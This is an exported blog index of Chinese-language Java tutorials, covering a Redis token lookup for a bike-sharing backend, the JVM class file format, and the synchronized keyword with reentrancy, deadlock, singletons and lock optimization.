&#123; log.error("Fail to get user by token in redis", e); throw e; &#125; &#125; &#125; return ue;&#125; 从缓存中取出来的是map数据，需要转换为对象，返回。缓存操作可能会产生异常，注意要try...catch... 这样，controller层就可以获取到用户在缓存中的信息，就可以获取到用户id，这样，controller层就实现了只需要移动端传一个token给我，就可以获取用户对象，继而根据用户要求修改对象。 postman: url: localhost:8888/user/modifyNickName data: { &quot;nickname&quot;:&quot;hh&quot; } head: user-token:d18a98174ce7abe81a8b3e0c1b792b7d 这里的token是login之后重新设置进缓存的token，这里可以通过命令行 keys * 获取这个token；然后hgetall token就可以拿到token对应的用户信息。]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[五、Class类文件结构]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%BA%94%E3%80%81Class%E7%B1%BB%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[总体概览一下Class文件是什么以及有什么。 整体感知class文件是一种8位字节的二进制流文件， 各个数据项按顺序紧密的从前向后排列， 相邻的项之间没有间隙， 这样可以使得class文件非常紧凑， 体积轻巧， 可以被JVM快速的加载至内存， 并且占据较少的内存空间。 我们的Java源文件， 在被编译之后， 每个类（或者接口）都单独占据一个class文件， 并且类中的所有信息都会在class文件中有相应的描述， 由于class文件很灵活， 它甚至比Java源文件有着更强的描述能力。 Class文件格式 换成表格的形式： 类型 名称 数量 u4 magic 1 u2 minor_version 1 u2 major_version 1 u2 constant_pool_count 1 cp_info constant_pool constant_pool_count - 1 u2 access_flags 1 u2 this_class 1 u2 super_class 1 u2 interfaces_count 1 u2 interfaces interfaces_count u2 fields_count 1 field_info fields fields_count u2 methods_count 1 method_info methods methods_count u2 attribute_count 1 attribute_info attributes attributes_count NO1. 魔数(magic)所有的由Java编译器编译而成的class文件的前4个字节都是“0xCAFEBABE” 它的作用在于： 当JVM在尝试加载某个文件到内存中来的时候，会首先判断此class文件有没有JVM认为可以接受的“签名”，即JVM会首先读取文件的前4个字节，判断该4个字节是否是“0xCAFEBABE”，如果是，则JVM会认为可以将此文件当作class文件来加载并使用。 NO2.版本号(minor_version,major_version)主版本号和次版本号在class文件中各占两个字节，副版本号占用第5、6两个字节，而主版本号则占用第7，8两个字节。JDK1.0的主版本号为45，以后的每个新主版本都会在原先版本的基础上加1。若现在使用的是JDK1.7编译出来的class文件，则相应的主版本号应该是51,对应的7，8个字节的十六进制的值应该是 0x33。 JVM在加载class文件的时候，会读取出主版本号，然后比较这个class文件的主版本号和JVM本身的版本号，如果JVM本身的版本号 &lt; class文件的版本号，JVM会认为加载不了这个class文件，会抛出我们经常见到的”java.lang.UnsupportedClassVersionError: Bad version number in .class file “ Error 错误；反之，JVM会认为可以加载此class文件，继续加载此class文件。 NO3.常量池计数器(constant_pool_count) 常量池是class文件中非常重要的结构，它描述着整个class文件的字面量信息。 常量池是由一组constant_pool结构体数组组成的，而数组的大小则由常量池计数器指定。常量池计数器constant_pool_count 的值 =constant_pool表中的成员数+ 1。constant_pool表的索引值只有在大于 0 且小于constant_pool_count时(即1~(constant_pool_count-1))才会被认为是有效的。 这个容量计数是从1而不是从0开始的，如果常量池容量为十六进制数0x0016，即十进制22，这就代表着常量池中有21个常量，索引值范围为1-21。在Class文件格式规范制定时，设计者将第0项常量空出来是有特殊考虑的，用于在特定情况下表达“不引用任何一个常量池项目”。 NO4.常量池数据区(constant_pool[contstant_pool_count-1])常量池，constant_pool是一种表结构,它包含 Class 文件结构及其子结构中引用的所有字符串常量、 类或接口名、字段名和其它常量。 常量池中的每一项都具备相同的格式特征——第一个字节作为类型标记用于识别该项是哪种类型的常量，称为 “tag byte” 。常量池的索引范围是 1 至constant_pool_count−1。常量池的具体细节我们会稍后讨论。 NO6.访问标志(access_flags)访问标志，access_flags 是一种掩码标志，用于表示某个类或者接口的访问权限及基础属性。 NO7.类索引(this_class)类索引，this_class的值必须是对constant_pool表中项目的一个有效索引值。constant_pool表在这个索引处的项必须为CONSTANT_Class_info 类型常量，表示这个 Class 文件所定义的类或接口。 NO8.父类索引(super_class)父类索引，对于类来说，super_class 的值必须为 0 或者是对constant_pool 表中项目的一个有效索引值。如果它的值不为 0，那 constant_pool 表在这个索引处的项必须为CONSTANT_Class_info 类型常量，表示这个 Class 文件所定义的类的直接父类。当前类的直接父类，以及它所有间接父类的access_flag 中都不能带有ACC_FINAL 标记。对于接口来说，它的Class文件的super_class项的值必须是对constant_pool表中项目的一个有效索引值。constant_pool表在这个索引处的项必须为代表 java.lang.Object 的 CONSTANT_Class_info 类型常量 。如果 Class 文件的 super_class的值为 0，那这个Class文件只可能是定义的是java.lang.Object类，只有它是唯一没有父类的类。 NO9.接口计数器(interfaces_count) 接口计数器，interfaces_count的值表示当前类或接口的直接父接口数量。 NO10.接口信息数据区(interfaces[interfaces_count])接口表，interfaces[]数组中的每个成员的值必须是一个对constant_pool表中项目的一个有效索引值， 它的长度为 interfaces_count。每个成员 interfaces[i] 必须为 CONSTANT_Class_info类型常量，其中 0 ≤ i &lt;interfaces_count。在interfaces[]数组中，成员所表示的接口顺序和对应的源代码中给定的接口顺序（从左至右）一样，即interfaces[0]对应的是源代码中最左边的接口。 NO11.字段计数器(fields_count)字段计数器，fields_count的值表示当前 Class 文件 fields[]数组的成员个数。 fields[]数组中每一项都是一个field_info结构的数据项，它用于表示该类或接口声明的类字段或者实例字段。 NO12.字段信息数据区(fields[fields_count])字段表，fields[]数组中的每个成员都必须是一个fields_info结构的数据项，用于表示当前类或接口中某个字段的完整描述。 fields[]数组描述当前类或接口声明的所有字段，但不包括从父类或父接口继承的部分。 NO13.方法计数器(methods_count) 方法计数器， methods_count的值表示当前Class 文件 methods[]数组的成员个数。Methods[]数组中每一项都是一个 method_info 结构的数据项。 NO14.方法信息数据区(methods[methods_count])方法表，methods[] 数组中的每个成员都必须是一个 method_info 结构的数据项，用于表示当前类或接口中某个方法的完整描述。如果某个method_info 结构的access_flags 项既没有设置 ACC_NATIVE 标志也没有设置ACC_ABSTRACT 标志，那么它所对应的方法体就应当可以被 Java 虚拟机直接从当前类加载，而不需要引用其它类。 method_info结构可以表示类和接口中定义的所有方法，包括实例方法、类方法、实例初始化方法方法和类或接口初始化方法方法 。methods[]数组只描述当前类或接口中声明的方法，不包括从父类或父接口继承的方法。 NO15.属性计数器(attributes_count)属性计数器，attributes_count的值表示当前 Class 文件attributes表的成员个数。attributes表中每一项都是一个attribute_info 结构的数据项。 NO16.属性信息数据区(attributes[attributes_count])属性表，attributes 表的每个项的值必须是attribute_info结构。 在Java 7 规范里，Class文件结构中的attributes表的项包括下列定义的属性： InnerClasses 、 EnclosingMethod 、 Synthetic 、Signature、SourceFile，SourceDebugExtension 、Deprecated、RuntimeVisibleAnnotations 、RuntimeInvisibleAnnotations以及BootstrapMethods属性。 对于支持 Class 文件格式版本号为 49.0 或更高的 Java 虚拟机实现，必须正确识别并读取attributes表中的Signature、RuntimeVisibleAnnotations和RuntimeInvisibleAnnotations属性。对于支持Class文件格式版本号为 51.0 或更高的 Java 虚拟机实现，必须正确识别并读取 attributes表中的BootstrapMethods属性。Java 7 规范 要求任一 Java 虚拟机实现可以自动忽略 Class 文件的 attributes表中的若干 （甚至全部） 它不可识别的属性项。任何本规范未定义的属性不能影响Class文件的语义，只能提供附加的描述信息 。]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[五、从卖票程序看synchronized特性]]></title>
    <url>%2F2018%2F07%2F21%2F%E4%BA%94%E3%80%81%E4%BB%8E%E5%8D%96%E7%A5%A8%E7%A8%8B%E5%BA%8F%E7%9C%8Bsynchronized%E7%89%B9%E6%80%A7%2F</url>
    <content type="text"><![CDATA[这一篇好好聊聊synchronized关键字。 1. 线程安全问题1.1 线程安全问题线程安全概念：当多个线程访问某一个类（对象或方法）时，这个类始终能表现出正确的行为，那么这个类（对象或方法）就是线程安全的。 在多线程编程中，可能会出现多个线程访问一个资源的情况，资源可以是同一内存区（变量，数组，或对象）、系统（数据库，web services等）或文件等等。如果不对这样的访问做控制，就可能出现不可预知的结果。这就是线程安全问题，常见的情况是“丢失修改”、“不可重复读”、“读‘脏’数据”等等。 线程安全就是多线程访问时，采用了加锁机制，当一个线程访问该类的某个数据时，进行保护，其他线程不能进行访问直到该线程读取完，其他线程才可使用。不会出现数据不一致或者数据污染。 线程不安全就是不提供数据访问保护，有可能出现多个线程先后更改数据造成所得到的数据是脏数据。这里的加锁机制常见的如：synchronized 1.2 线程安全问题解决方法上面的问题归根结底是由于两个线程访问相同的资源造成的。对于并发编程，需要采取措施防止两个线程来访问相同的资源。 一种措施是当资源被一个线程访问时，为其加锁。第一个访问资源的线程必须锁定该资源，是其他任务在资源被解锁前不能访问该资源。 基本上所有的并发模式在解决线程安全问题时，都采用“序列化访问临界资源”的方案。即在同一时刻，只能有一个线程访问临界资源，也称作同步互斥访问。通常来说，是在访问临界资源的代码前面加上一个锁，当访问完临界资源后释放锁，让其他线程继续访问。 在Java多线程编程当中，提供了以下几种方式来实现线程安全： 内部锁（Synchronized）和显式锁（Lock）：属于互斥同步方法，是重量级的多线程同步机制，可能会引起上下文切换和线程调度，它同时提供内存可见性、有序性和原子性。 volatile：轻量级多线程同步机制，不会引起上下文切换和线程调度。仅提供内存可见性、有序性保证，不提供原子性。 CAS原子指令：属于非阻塞同步方法，轻量级多线程同步机制，不会引起上下文切换和线程调度。它同时提供内存可见性、有序性和原子化更新保证。 这里来好好谈谈Synchronized。 2. synchronized修饰符synchronized：可以在任意对象及方法上加锁，而加锁的这段代码称为“互斥区”或“临界区”. 2.1 不使用synchronized实例123456789101112131415161718public class SellTicket implements Runnable&#123; private int count = 5; @Override public void run() &#123; sellTicket(); &#125; private void sellTicket() &#123; if(count&gt;0)&#123; count--; System.out.println(Thread.currentThread().getName()+",还剩"+count); &#125;else &#123; System.out.println("票卖光了"); &#125; &#125; &#125; 12345678910111213141516public class Main &#123; public static void main(String[] args) &#123; SellTicket sellTicket = new SellTicket(); Thread t1 = new Thread(sellTicket, "thread1"); Thread t2 = new Thread(sellTicket, "thread2"); Thread t3 = new Thread(sellTicket, "thread3"); Thread t4 = new Thread(sellTicket, "thread4"); Thread t5 = new Thread(sellTicket, "thread5"); t1.start(); t2.start(); t3.start(); t4.start(); t5.start(); &#125;&#125; 某一次运行的结果是: 12345thread2,还剩2thread1,还剩2thread3,还剩2thread4,还剩0thread5,还剩0 很显然，多个线程之间打架了，数据混乱了。这是因为，多个线程同时操作run（）方法，对count进行修改，进而造成错误。 2.2 使用synchronized12345678private synchronized void sellTicket() &#123; if(count&gt;0)&#123; count--; System.out.println(Thread.currentThread().getName()+",还剩"+count); &#125;else &#123; System.out.println("票卖光了"); &#125;&#125; 或者写成同步代码块： 12345678910private void sellTicket() &#123; synchronized (this) &#123; if(count&gt;0)&#123; count--; System.out.println(Thread.currentThread().getName()+",还剩"+count); &#125;else &#123; System.out.println("票卖光了"); &#125; &#125;&#125; 结果只有一个： 12345thread1 count:4thread4 count:3thread5 count:2thread3 count:1thread2 count:0 结果是正确的，可以看出代码A和代码B的区别就是在sellTicket()方法上加上了synchronized修饰。 说明：当多个线程访问MyThread 的run方法的时候，如果使用了synchronized修饰，那个多线程就会以排队的方式进行处理（这里排队是按照CPU分配的先后顺序而定的），一个线程想要执行synchronized修饰的方法里的代码，首先是尝试获得锁，如果拿到锁，执行synchronized代码体的内容，如果拿不到锁的话，这个线程就会不断的尝试获得这把锁，直到拿到为止，而且多个线程同时去竞争这把锁，也就是会出现锁竞争的问题。 2.3 一个对象有一把锁！多个对象多个锁！123456789101112131415public class Main &#123; public static void main(String[] args) &#123; Thread t1 = new Thread(new SellTicket(), "thread1"); Thread t2 = new Thread(new SellTicket(), "thread2"); Thread t3 = new Thread(new SellTicket(), "thread3"); Thread t4 = new Thread(new SellTicket(), "thread4"); Thread t5 = new Thread(new SellTicket(), "thread5"); t1.start(); t2.start(); t3.start(); t4.start(); t5.start(); &#125;&#125; 线程任务SellTicket()无论给不给sellTicket()加锁，结果都是一样的： 12345thread1,还剩4thread2,还剩4thread3,还剩4thread5,还剩4thread4,还剩4 这是因为我这里是五个不同的对象，每个对象各自获取自己的锁，互不影响，所以都是4. 关键字synchronized取得的锁都是对象锁，而不是把一段代码或方法当做锁，所以上述实例代码C中哪个线程先执行synchronized 关键字的方法，那个线程就持有该方法所属对象的锁，五个对象，线程获得的就是两个不同对象的不同的锁，他们互不影响的。 那么，我们在正常的场景的时候，肯定是有一种情况的就是，一个类new出来的所有对象会对一个变量count进行操作，那么如何实现哪？很简单就是加static，我们知道，用static修改的方法或者变量，在该类的所有对象是具有相同的引用的，这样的话，无论实例化多少对象，调用的都是一个方法。 Main： 123456789101112131415public class Main &#123; public static void main(String[] args) &#123; Thread t1 = new Thread(new SellTicket(), "thread1"); Thread t2 = new Thread(new SellTicket(), "thread2"); Thread t3 = new Thread(new SellTicket(), "thread3"); Thread t4 = new Thread(new SellTicket(), "thread4"); Thread t5 = new Thread(new SellTicket(), "thread5"); t1.start(); t2.start(); t3.start(); t4.start(); t5.start(); &#125;&#125; SellTicket： 1234567891011121314151617public class SellTicket implements Runnable&#123; private static int count = 5; @Override public void run() &#123; sellTicket(); &#125; private synchronized static void sellTicket() &#123; if(count&gt;0)&#123; count--; System.out.println(Thread.currentThread().getName()+",还剩"+count); &#125;else &#123; System.out.println("票卖光了"); &#125; &#125;&#125; 或者： 12345678910private static void sellTicket() &#123; synchronized (SellTicket.class) &#123; if(count&gt;0)&#123; count--; System.out.println(Thread.currentThread().getName()+",还剩"+count); &#125;else &#123; System.out.println("票卖光了"); &#125; &#125;&#125; 仔细看，我们给sellTicket设定为static静态方法，那么这个方法就从之前的对象方法上升到类级别方法，这个类所有的对象都调用的同一个方法。实现资源的共享和加锁。 3. Synchronized锁重入3.1 什么是可重入锁锁的概念就不用多解释了,当某个线程A已经持有了一个锁,当线程B尝试进入被这个锁保护的代码段的时候.就会被阻塞. 而锁的操作粒度是”线程”,而不是调用.同一个线程再次进入同步代码的时候.可以使用自己已经获取到的锁,这就是可重入锁。 3.2 可重入锁的小例子1234567891011121314151617181920212223242526public class SyncDubbo &#123; public synchronized void method1()&#123; System.out.println("method1..."); method2(); &#125; public synchronized void method2()&#123; System.out.println("method2..."); method3(); &#125; public synchronized void method3()&#123; System.out.println("method3..."); &#125; public static void main(String[] args) &#123; SyncDubbo syncDubbo = new SyncDubbo(); new Thread(new Runnable() &#123; @Override public void run() &#123; syncDubbo.method1(); &#125; &#125;).start(); &#125;&#125; 示例代码向我们演示了，如何在一个已经被synchronized关键字修饰过的方法再去调用对象中其他被synchronized修饰的方法。 3.3 为什么要可重入我们上一篇文章中介绍了“一个对象一把锁，多个对象多把锁”，可重入锁的概念就是：自己可以获取自己的内部锁。 假如有1个线程T获得了对象A的锁，那么该线程T如果在未释放前再次请求该对象的锁时，如果没有可重入锁的机制，是不会获取到锁的，这样的话就会出现死锁的情况。 就如代码A体现的那样，线程T在执行到method1（）内部的时候，由于该线程已经获取了该对象syncDubbo 的对象锁，当执行到调用method2（） 的时候，会再次请求该对象的对象锁，如果没有可重入锁机制的话，由于该线程T还未释放在刚进入method1（） 时获取的对象锁，当执行到调用method2（） 的时候，就会出现死锁。 3.4 可重入锁到底有什么用哪？正如上述代码A和（4）中解释那样，最大的作用是避免死锁。假如有一个场景：用户名和密码保存在本地txt文件中，则登录验证方法和更新密码方法都应该被加synchronized，那么当更新密码的时候需要验证密码的合法性，所以需要调用验证方法，此时是可以调用的。 补充：什么是死锁？ 线程A当前持有互斥所锁lock1，线程B当前持有互斥锁lock2。接下来，当线程A仍然持有lock1时，它试图获取lock2，因为线程B正持有lock2，因此线程A会阻塞等待线程B对lock2的释放。如果此时线程B在持有lock2的时候，也在试图获取lock1，因为线程A正持有lock1，因此线程B会阻塞等待A对lock1的释放。二者都在等待对方所持有锁的释放，而二者却又都没释放自己所持有的锁，这时二者便会一直阻塞下去。这种情形称为死锁。 一个例子来说明： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class DeadLock &#123; private static Object obj1 = new Object(); private static Object obj2 = new Object(); public static void a()&#123; synchronized (obj1) &#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; synchronized (obj2) &#123; System.out.println("a"); &#125; &#125; &#125; public static void b()&#123; synchronized (obj2) &#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; synchronized (obj1) &#123; System.out.println("b"); &#125; &#125; &#125; public static void main(String[] args) &#123; DeadLock d = new DeadLock(); new Thread(new Runnable() &#123; @Override public void run() &#123; d.a(); &#125; &#125;).start(); new Thread(new Runnable() &#123; @Override public void run() &#123; d.b(); &#125; &#125;).start(); &#125;&#125; 产生死锁的原因主要是： （1） 因为系统资源不足。 （2） 进程运行推进的顺序不合适。 （3） 资源分配不当等。 如何解决死锁： 一般地，解决死锁的方法分为死锁的预防，避免，检测与恢复三种（注意：死锁的检测与恢复是一个方法） 死锁的预防是保证系统不进入死锁状态的一种策略。它的基本思想是要求进程申请资源时遵循某种协议，从而打破产生死锁的四个必要条件中的一个或几个，保证系统不会进入死锁状态。 死锁的避免，它不限制进程有关申请资源的命令，而是对进程所发出的每一个申请资源命令加以动态地检查，并根据检查结果决定是否进行资源分配。就是说，在资源分配过程中若预测有发生死锁的可能性，则加以避免。这种方法的关键是确定资源分配的安全性。 死锁的检测与恢复，一般来说，由于操作系统有并发，共享以及随机性等特点，通过预防和避免的手段达到排除死锁的目的是很困难的。这需要较大的系统开销，而且不能充分利用资源。为此，一种简便的方法是系统为进程分配资源时，不采取任何限制性措施，但是提供了检测和解脱死锁的手段：能发现死锁并从死锁状态中恢复出来。因此，在实际的操作系统中往往采用死锁的检测与恢复方法来排除死锁。死锁检测与恢复是指系统设有专门的机构，当死锁发生时，该机构能够检测到死锁发生的位置和原因，并能通过外力破坏死锁发生的必要条件，从而使得并发进程从死锁状态中恢复出来。 （1）最简单，最常用的方法就是进行系统的重新启动，不过这种方法代价很大，它意味着在这之前所有的进程已经完成的计算工作都将付之东流，包括参与死锁的那些进程，以及未参与死锁的进程。 （2）撤消进程，剥夺资源。终止参与死锁的进程，收回它们占有的资源，从而解除死锁。这时又分两种情况：一次性撤消参与死锁的全部进程，剥夺全部资源；或者逐步撤消参与死锁的进程，逐步收回死锁进程占有的资源。一般来说，选择逐步撤消的进程时要按照一定的原则进行，目的是撤消那些代价最小的进程，比如按进程的优先级确定进程的代价；考虑进程运行时的代价和与此进程相关的外部作业的代价等因素。 3.5 可重入锁支持在父子类继承的环境中1234567891011121314public class Father &#123; public synchronized void doSomething()&#123; ...... &#125; &#125; public class Child extends Father &#123; public synchronized void doSomething()&#123; ...... super.doSomething(); &#125; &#125; 执行子 类的方法的时候,先获取了一次Widget的锁,然后在执行super的时候,就要获取一次,如果不可重入,那么就跪了. 在这里，可能会产生疑问： 重入”代表一个线程可以再次获得同一个对象的锁。可是你给出的代码示例中，我理解的是一个线程调用Child的doSomething方法前或得了Child对象的锁，super.doSomething方法调用时，次线程获得了Child对象父对象的锁。两个锁属于不同的对象，这还算是重入吗？ 解释：当Child实例对象调用doSomething方法时，此时持有的是Child实例对象的锁，之后调用super.doSomething();，这时仍然对于Child实例对象加锁，因为此时仍然使用的是Child实例对象内存空间的数据。 至于这句话的理解，就牵涉到继承的机制： 在一个子类被创建的时候，首先会在内存中创建一个父类对象，然后在父类对象外部放上子类独有的属性，两者合起来形成一个子类的对象。所以所谓的继承使子类拥有父类所有的属性和方法其实可以这样理解，子类对象确实拥有父类对象中所有的属性和方法，但是父类对象中的私有属性和方法，子类是无法访问到的，只是拥有，但不能使用。就像有些东西你可能拥有，但是你并不能使用。所以子类对象是绝对大于父类对象的，所谓的子类对象只能继承父类非私有的属性及方法的说法是错误的。可以继承，只是无法访问到而已。 之所以网上有很多说只继承protected或者private的，是因为从语言的角度出发的： 从内存的角度来看，的确是继承了的，可以写一个简单的继承类，debug看子类的属性是否存在父类的private属性，事实证明是有的。 针对这里有人说：不是创建一个父类对象，而只是创建一个父类空间并进行相应的初始化。对此，我一开始也是这么想的，不过当我看到这个答案的时候，又觉得很有道理： 会创建父类对象。《Java编程思想》（第四版）129页，当创建一个导出类对象时，该对象包含了一个基类的子对象，这子对象与你用基类直接创建的对象是一样的，二者区别在于后者来源于外部，而基类的子对象被包装在导出类对象内部。 4. Synchronized的其他特性4.1 出现异常时，锁自动释放1234567891011121314151617181920212223public class SyncException &#123; private int i = 0; public synchronized void operation() &#123; while (true) &#123; i++; System.out.println(Thread.currentThread().getName() + " , i= " + i); if (i == 10) &#123; Integer.parseInt("a"); &#125; &#125; &#125; public static void main(String[] args) &#123; final SyncException se = new SyncException(); new Thread(new Runnable() &#123; public void run() &#123; se.operation(); &#125; &#125;, "t1").start(); &#125;&#125; 执行结果如下： 123456789101112t1 , i= 2t1 , i= 3t1 , i= 4t1 , i= 5t1 , i= 6t1 , i= 7t1 , i= 8t1 , i= 9t1 , i= 10java.lang.NumberFormatException: For input string: &quot;a&quot; at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) //其他输出信息 4.2 饿汉式单例模式123456789public class Singleton &#123; private Singleton()&#123;&#125;//不允许new private static Singleton singleton = new Singleton(); public static Singleton getInstance()&#123; return singleton; &#125;&#125; 在多线程环境下不存在线程安全问题。线程安全必须满足以下三个条件：多线程环境，必须有共享资源，对资源进行非原子性操作。这里是满足的。 4.3 懒汉式单例模式123456789101112public class Singleton2 &#123; private Singleton2()&#123;&#125;; private static Singleton2 instance; public static Singleton2 getInstance()&#123; if(instance == null)&#123; instance = new Singleton2(); &#125; return instance; &#125;&#125; 存在线程安全问题，因为进行非原子操作这一条不满足。有可能多次new Singleton2(). 我们分析了可能在instance = new Singleton2();这里出现问题，那么我们稍加一个延时看看： 1234567891011121314151617public class Singleton2 &#123; private Singleton2()&#123;&#125;; private static Singleton2 instance; public static Singleton2 getInstance()&#123; if(instance == null)&#123; try &#123; Thread.sleep(10); instance = new Singleton2();//这里会出现线程安全性问题 &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; return instance; &#125;&#125; Main： 123456789101112131415public class Main &#123; public static void main(String[] args) &#123; ExecutorService threadPool = Executors.newFixedThreadPool(20); for(int i=0; i&lt;20; i++)&#123; threadPool.execute(new Runnable() &#123; @Override public void run() &#123; System.out.println(Thread.currentThread().getName()+":"+Singleton2.getInstance()); &#125; &#125;); &#125; &#125;&#125; 输出结果： 1234567891011121314151617181920pool-1-thread-5:test08.Singleton2@4e7cf7cbpool-1-thread-1:test08.Singleton2@799a2705pool-1-thread-3:test08.Singleton2@4e7cf7cbpool-1-thread-6:test08.Singleton2@4e7cf7cbpool-1-thread-4:test08.Singleton2@65fa68dpool-1-thread-7:test08.Singleton2@6436c9edpool-1-thread-12:test08.Singleton2@5be19a7dpool-1-thread-8:test08.Singleton2@36867d22pool-1-thread-19:test08.Singleton2@b0545bcpool-1-thread-2:test08.Singleton2@1697446epool-1-thread-20:test08.Singleton2@2179f8b4pool-1-thread-9:test08.Singleton2@d12ab7fpool-1-thread-10:test08.Singleton2@3b4c2349pool-1-thread-15:test08.Singleton2@39117c62pool-1-thread-11:test08.Singleton2@51b5a5b1pool-1-thread-13:test08.Singleton2@10d9dd76pool-1-thread-14:test08.Singleton2@57871364pool-1-thread-16:test08.Singleton2@c0647e4pool-1-thread-17:test08.Singleton2@e9c9830pool-1-thread-18:test08.Singleton2@246f9732 很显然，创建了很多的实例，不符合单例的初衷了。 解决方案01： 1public static synchronized Singleton2 getInstance()&#123;...&#125; 虽然这样可以解决这个问题，但是synchronized比较重，当并发较高时，性能有瓶颈。为了提高性能，需要其他的办法。 4.4 双重校验锁12345678910111213141516public class Singleton2 &#123; private Singleton2()&#123;&#125;; private static Singleton2 instance; public static Singleton2 getInstance()&#123; if(instance == null)&#123; synchronized (Singleton2.class) &#123; if(instance == null)&#123; instance = new Singleton2(); &#125; &#125; &#125; return instance; &#125;&#125; (双重校验锁的方式相对于线程安全的懒汉模式来说，从表面上是将锁的粒度缩小为方法内部的同步代码块，而不是线程安全的懒汉模式同步整个方法！是锁优化中：减小锁粒度的一种表现形式) 但是，需要注意的是，上述的代码是错误的写法，这是因为：指令重排优化，可能会导致初始化单例对象和将该对象地址赋值给instance字段的顺序与上面Java代码中书写的顺序不同。 例如：线程A在创建单例对象时，在构造方法被调用之前，就为 该对象分配了内存空间并将对象设置为默认值。此时线程A就可以将分配的内存地址赋值给instance字段了，然而该对象可能还没有完成初始化操作。线程B来调用newInstance()方法，得到的 就是未初始化完全的单例对象，这就会导致系统出现异常行为。 为了解决上述的问题，可以使用volatile关键字进行修饰instance字段。volatile关键字在这里的含义就是禁止指令的重排序优化（另一个作用是提供内存可见性），从而保证instance字段被初始化时，单例对象已经被完全初始化。 12345678910111213141516public class Singleton2 &#123; private Singleton2()&#123;&#125;; private static volatile Singleton2 instance;//volatile public static Singleton2 getInstance()&#123; if(instance == null)&#123; synchronized (Singleton2.class) &#123; if(instance == null)&#123; instance = new Singleton2(); &#125; &#125; &#125; return instance; &#125;&#125; 那么问题来了，为什么volatile关键字可以实现禁止指令的重排序优化 以及什么是指令重排序优化哪？ 在Java内存模型中我们都是围绕着原子性、有序性和可见性进行讨论的。为了确保线程间的原子性、有序性和可见性，Java中使用了一些特殊的关键字申明或者是特殊的操作来告诉虚拟机，在这个地方，要注意一下，不能随意变动优化目标指令。关键字volatile就是其中之一。 指令重排序是JVM为了优化指令，提高程序运行效率，在不影响单线程程序执行结果的前提下，尽可能地提高并行度（比如：将多条指定并行执行或者是调整指令的执行顺序）。编译器、处理器也遵循这样一个目标。注意是单线程。可显而知，多线程的情况下指令重排序就会给程序员带来问题。最重要的一个问题就是程序执行的顺序可能会被调整，另一个问题是对修改的属性无法及时的通知其他线程，已达到所有线程操作该属性的可见性。 根据编译器的优化规则，如果不使用volatile关键字对变量进行修饰的，那么这个变量被修改后，其他线程可能并不会被通知到，甚至在别的线程中，看到变量修改顺序都会是反的。一旦使用volatile关键字进行修饰的话，虚拟机就会特别小心的处理这种情况。 5. 锁优化jdk1.6对锁的实现引入了大量的优化，如自旋锁、适应性自旋锁、锁消除、锁粗化、偏向锁、轻量级锁等技术来减少锁操作的开销。 锁主要存在四种状态，依次是：无锁状态、偏向锁状态、轻量级锁状态、重量级锁状态，他们会随着竞争的激烈而逐渐升级。注意锁可以升级不可降级，这种策略是为了提高获得锁和释放锁的效率。 自旋锁线程的阻塞和唤醒需要CPU从用户态转为核心态，频繁的阻塞和唤醒对CPU来说是一件负担很重的工作，势必会给系统的并发性能带来很大的压力。同时我们发现在许多应用上面，对象锁的锁状态只会持续很短一段时间，为了这一段很短的时间频繁地阻塞和唤醒线程是非常不值得的。所以引入自旋锁。 何谓自旋锁？ 所谓自旋锁，就是让该线程等待一段时间，不会被立即挂起，看持有锁的线程是否会很快释放锁。怎么等待呢？执行一段无意义的循环即可（自旋）。 自旋等待不能替代阻塞，先不说对处理器数量的要求（多核，貌似现在没有单核的处理器了），虽然它可以避免线程切换带来的开销，但是它占用了处理器的时间。如果持有锁的线程很快就释放了锁，那么自旋的效率就非常好，反之，自旋的线程就会白白消耗掉处理的资源，它不会做任何有意义的工作，典型的占着茅坑不拉屎，这样反而会带来性能上的浪费。所以说，自旋等待的时间（自旋的次数）必须要有一个限度，如果自旋超过了定义的时间仍然没有获取到锁，则应该被挂起。 自旋锁在JDK 1.4.2中引入，默认关闭，但是可以使用-XX:+UseSpinning开开启，在JDK1.6中默认开启。同时自旋的默认次数为10次，可以通过参数-XX:PreBlockSpin来调整； 如果通过参数-XX:preBlockSpin来调整自旋锁的自旋次数，会带来诸多不便。假如我将参数调整为10，但是系统很多线程都是等你刚刚退出的时候就释放了锁（假如你多自旋一两次就可以获取锁），你是不是很尴尬。于是JDK1.6引入自适应的自旋锁，让虚拟机会变得越来越聪明。 适应自旋锁JDK 1.6引入了更加聪明的自旋锁，即自适应自旋锁。所谓自适应就意味着自旋的次数不再是固定的，它是由前一次在同一个锁上的自旋时间及锁的拥有者的状态来决定。它怎么做呢？线程如果自旋成功了，那么下次自旋的次数会更加多，因为虚拟机认为既然上次成功了，那么此次自旋也很有可能会再次成功，那么它就会允许自旋等待持续的次数更多。反之，如果对于某个锁，很少有自旋能够成功的，那么在以后要或者这个锁的时候自旋的次数会减少甚至省略掉自旋过程，以免浪费处理器资源。 有了自适应自旋锁，随着程序运行和性能监控信息的不断完善，虚拟机对程序锁的状况预测会越来越准确，虚拟机会变得越来越聪明。 锁消除为了保证数据的完整性，我们在进行操作时需要对这部分操作进行同步控制，但是在有些情况下，JVM检测到不可能存在共享数据竞争，这是JVM会对这些同步锁进行锁消除。锁消除的依据是逃逸分析的数据支持。 如果不存在竞争，为什么还需要加锁呢？所以锁消除可以节省毫无意义的请求锁的时间。变量是否逃逸，对于虚拟机来说需要使用数据流分析来确定，但是对于我们程序员来说这还不清楚么？我们会在明明知道不存在数据竞争的代码块前加上同步吗？但是有时候程序并不是我们所想的那样？我们虽然没有显示使用锁，但是我们在使用一些JDK的内置API时，如StringBuffer、Vector、HashTable等，这个时候会存在隐形的加锁操作。比如StringBuffer的append()方法，Vector的add()方法： 12345678public void vectorTest()&#123; Vector&lt;String&gt; vector = new Vector&lt;String&gt;(); for(int i = 0 ; i &lt; 10 ; i++)&#123; vector.add(i + ""); &#125; System.out.println(vector);&#125; 在运行这段代码时，JVM可以明显检测到变量vector没有逃逸出方法vectorTest()之外，所以JVM可以大胆地将vector内部的加锁操作消除。 